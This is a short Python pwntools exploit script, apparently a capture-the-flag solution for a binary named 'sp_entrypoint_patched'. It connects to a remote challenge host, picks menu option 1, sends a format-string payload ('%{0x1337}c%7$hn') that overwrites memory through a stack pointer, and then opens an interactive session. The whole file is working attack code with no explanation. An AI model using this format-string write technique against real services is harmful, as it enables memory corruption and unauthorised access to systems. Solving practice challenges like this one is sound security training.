#!/usr/bin/env python3

from pwn import *

exe = ELF("./sp_entrypoint_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
p = remote('94.237.63.224',50822)
#p = process()
#gdb.attach(p,gdbscript='''
#           brva 0x0000000000000D95
#           ''')
#input()
p.sendlineafter(b'> ',b'1')
payload = f"%{0x1337}c%7$hn".encode()
p.send(payload)


p.interactive()
